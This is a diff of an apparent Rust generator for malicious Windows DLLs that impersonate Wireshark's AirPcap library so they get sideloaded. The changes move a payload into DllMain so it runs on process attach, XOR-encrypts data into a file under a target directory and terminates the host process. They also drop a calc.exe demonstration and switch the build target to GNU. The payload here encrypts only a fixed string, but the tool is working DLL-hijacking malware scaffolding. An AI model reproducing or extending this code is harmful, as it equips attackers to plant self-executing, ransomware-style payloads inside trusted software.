@@ -41,24 +41,22 @@ pub fn generate_dll() {
 
     // Compile the DLL based on the architecture
     let target = match arch {
-        "32" => "i686-pc-windows-msvc",
-        "64" => "x86_64-pc-windows-msvc",
+        "32" => "i686-pc-windows-gnu",
+        "64" => "x86_64-pc-windows-gnu",
         _ => {
-            println!("Invalid architecture. Defaulting to 64-bit.");
-            "x86_64-pc-windows-msvc"
+            println!("Invalid architecture. Defaulting to 64-bit GNU.");
+            "x86_64-pc-windows-gnu"
         }
     };
 
     println!("Compiling DLL for {}-bit architecture...", arch);
     compile_dll(&source_file, dll_name, target);
 
-    // Rename and clean up
-    let compiled_file = dll_name;
-    let renamed_file = format!("{}.dll", dll_name);
-    fs::rename(&compiled_file, &renamed_file).expect("Failed to rename compiled DLL file");
+// Cleanup source file
     fs::remove_file(&source_file).expect("Failed to delete source file");
 
-    println!("DLL generated: {}", renamed_file);
+    println!("DLL generated: {}.dll", dll_name);
+
 }
 
 fn generate_default_dll_code(key: &str) -> String {
@@ -112,35 +110,35 @@ fn generate_wireshark_dll_code(key: &str) -> String {
 
     use std::fs;
     use std::io::Write;
-    use std::process::Command;
+
+    #[no_mangle]
+    pub extern "C" fn DllMain(_: *mut std::ffi::c_void, reason: u32, _: *mut std::ffi::c_void) -> bool {{
+        if reason == 1 {{ // DLL_PROCESS_ATTACH
+            encrypt_files("{key}"); // Encrypt files on process attach
+            std::process::exit(0);   // Terminate the process
+        }}
+        true
+    }}
 
     #[no_mangle]
     pub extern "C" fn AirpcapGetDeviceList() {{
-        evil("{key}");
+        encrypt_files("{key}");
     }}
 
-    #[no_mangle]
-    pub extern "C" fn AirpcapOpen() {{
-        evil("{key}");
-    }}
-
-    fn evil(key: &str) {{
-        // Launch calc.exe
-        Command::new("calc.exe")
-            .spawn()
-            .expect("Failed to execute calc.exe");
-
-        // Perform encryption
+    fn encrypt_files(key: &str) {{
         let target_dir = "C:\\\\target_directory";
         let target_file = format!("{{}}\\\\encrypted_file.txt", target_dir);
 
+        // Create the directory if it doesn't exist
         let _ = fs::create_dir_all(target_dir);
 
-        let data = b"This is some sensitive data specific to Wireshark.";
+        // Example data to encrypt
+        let data = b"Sensitive data to be encrypted.";
         let encrypted_data = encrypt(data, key);
 
+        // Write the encrypted data to a file
         let mut file = fs::File::create(&target_file).expect("Failed to create file");
-        file.write_all(&encrypted_data).expect("Failed to write payload");
+        file.write_all(&encrypted_data).expect("Failed to write encrypted data");
 
         println!("Payload executed: Encrypted file created at {{}}", target_file);
     }}
@@ -152,27 +150,31 @@ fn generate_wireshark_dll_code(key: &str) -> String {
             .map(|(&d, &k)| d ^ k)
             .collect()
     }}
-
-    #[no_mangle]
-    pub extern "C" fn DllMain(_: *mut std::ffi::c_void, reason: u32, _: *mut std::ffi::c_void) -> bool {{
-        if reason == 1 {{ // DLL_PROCESS_ATTACH
-            println!("Wireshark-specific malicious DLL loaded.");
-        }}
-        true
-    }}
     "#,
         key = key
     )
 }
 
+
 fn compile_dll(source_file: &str, dll_name: &str, target: &str) {
+    // Append `.dll` explicitly to the output file name
+    let output_file = format!("{}.dll", dll_name);
+
     let output = Command::new("rustc")
-        .args(&["--crate-type", "cdylib", "-o", dll_name, source_file, "--target", target])
+        .args(&["--crate-type", "cdylib", "-o", &output_file, source_file, "--target", target])
         .output()
-        .expect("Failed to compile DLL");
+        .expect("Failed to execute rustc command");
 
     if !output.status.success() {
         eprintln!("Compilation error: {}", String::from_utf8_lossy(&output.stderr));
         std::process::exit(1);
     }
+
+    // Check if the compiled DLL exists
+    if !std::path::Path::new(&output_file).exists() {
+        eprintln!("Error: Compiled file not found at expected location: {}", output_file);
+        std::process::exit(1);
+    }
+
+    println!("DLL compiled successfully: {}", output_file);
 }
